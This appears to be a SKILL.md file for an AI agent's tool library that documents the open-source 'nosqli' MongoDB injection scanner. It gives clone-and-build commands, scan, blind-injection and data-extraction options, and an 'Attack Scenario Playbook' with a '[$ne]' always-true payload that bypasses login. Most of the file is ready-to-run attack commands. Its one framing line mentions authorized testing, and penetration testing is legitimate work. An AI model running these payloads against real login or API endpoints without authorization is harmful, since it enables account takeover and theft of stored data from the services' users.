---
name: nosqli-mongo-injection
description: "NoSQL login bypass. Signals: web vulnerability, injection, MongoDB injection scan, blind injection, data extraction."
zh-signals: "nosqli: 登录接口 NoSQL 绕过。信号:web漏洞,注入,MongoDB 注入扫描,盲注模式,数据提取。"
when-to-use: >-
  Use when testing authorized login or API endpoints backed by MongoDB for NoSQL operator
  injection, including blind injection and data extraction through GET or POST parameters.
---

# nosqli

- Attack Category: C09 Web Exploitation (NoSQL Injection)
- Upstream Repository: https://github.com/Charlie-belmer/nosqli
- Upstream License: AgPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/Charlie-belmer/nosqli && cd nosqli && go build -o nosqli
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./nosqli scan -u 'https://t.com/login'` | MongoDB injection scan |
| `./nosqli scan -t body -p email -u url -d 'email=x&pass=y'` | POST body parameter injection |
| `inject -u url` | Blind injection mode |
| `extract -u url` | Data extraction |

## Attack Scenario Playbook

### NoSQL bypass on login endpoints

```bash
./nosqli scan -u 'https://api.t.com/auth' -t body -p username -d 'username[$ne]=x&password[$ne]=x'
# [$ne] always-true comparison bypasses login; the tool auto-detects it
```

## Notes

Written in Go, performs blind injection and data extraction against Mongo operator injection in JSON/body ($ne/$gt/$regex).
